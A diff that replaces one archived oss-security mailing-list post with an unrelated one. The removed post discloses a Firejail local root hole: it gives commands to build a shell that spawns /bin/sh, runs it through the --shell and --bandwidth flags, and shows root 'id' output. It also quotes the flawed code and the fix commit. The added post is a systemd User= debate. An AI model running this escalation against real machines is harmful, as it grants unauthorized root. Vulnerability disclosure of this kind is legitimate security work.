@@ -1,64 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/07/3
-Message-ID: <1483787608.8979.95.camel@juliet.mcarpenter.org>
-Date: Sat, 07 Jan 2017 12:13:28 +0100
-From: Martin Carpenter <mcarpenter@...e.fr>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/06/9
+Message-ID: <20170706132816.GA3056@takahe.colorado.edu>
+Date: Thu, 6 Jul 2017 07:28:16 -0600
+From: Leonid Isaev <leonid.isaev@...a.colorado.edu>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: Firejail local root exploit
+Subject: Re: systemd fails to parse user that should run service
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 2017-01-05 at 23:37 +0100, Martin Carpenter wrote:
-> A handful of concrete examples that I have reported are below.
+On Thu, Jul 06, 2017 at 01:17:55PM +0100, Simon McVittie wrote:
+> systemd units are analogous to LSB init scripts,
+> which all start as root, and drop privileges internally if they want to.
 
-Another (new) one: MITRE can you please assign a CVE?
+Hmm, no, no and once again no. SystemdD units are sold as something simple and
+transparent, and hence *associated with a software they launch*, not a given
+systemD/OS version. In contrast, init scripts are specific to a distibution
+(would you just run init scripts from Debian on a CentOS or ArchLinux?)
 
-6. Root shell via --bandwidth and --shell
+For example, if I maintain a backup script that drops privileges via su(1), I
+can use the wonderful systemD unit syntax, specify User=xxx and have my package
+manager install that user in post_install. The problem is that my new and shiny
+script won't work as intended on old systemD versions which silently ignore
+User= directive. This situation is far worse than a simple failure to properly
+parse User= config string that seems to so much excite ppl, as it obsoletes
+the User= directive and perhaps others too. I'm far from sysadmin culture, but
+is this called "sh*t hitting the fan"?
 
-Reported at:
-https://github.com/netblue30/firejail/issues/1023
+So, the lesson for all developers would be to rely on systemD features as
+LITTLE as possible and do all important privilege stuff inside their software.
+SystemD units should therefore only contain Exec{Start,Stop,Restart}=.
 
-Fixed at:
-  commit 5d43fdcd215203868d440ffc42036f5f5ffc89fc
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Fri Jan 6 22:45:11 2017 -0500
-
-      security fix
-
-
-Quoting for list:
-
-----8<----
-[Against current HEAD, commit 64355]
-
-In a first window run:
-
-$ firejail --noprofile --name=x --net=eth0
-
-In a second window, firstly create a dumb shell that ignores -c:
-
-$ echo 'int main() {system("/bin/sh");}' | gcc -xc -o dumbshell -
-
-and then secondly invoke that shell via the --shell and --bandwidth
-flags to obtain root:
-
-$ firejail --shell=./dumbshell --bandwidth=x status
-# id
-uid=0(root) gid=0(root)
-groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),125(vboxusers),2000(wiki),10000(martin) context=system_u:system_r:initrc_t:s0
-
-Error occurs at
-https://github.com/netblue30/firejail/blob/6435525696e8eda2d1bc0ef50488523422b9126d/src/firejail/bandwidth.c#L445-L451
-
-char *arg[4];
-arg[0] = cfg.shell;
-arg[1] = "-c";
-arg[2] = cmd;
-arg[3] = NULL;
-clearenv();
-execvp(arg[0], arg);
-
-I don't see any good reason to permit a user-specified shell to run a
-bandwidth command.
-----8<----
-
-
+Cheers,
+-- 
+Leonid Isaev
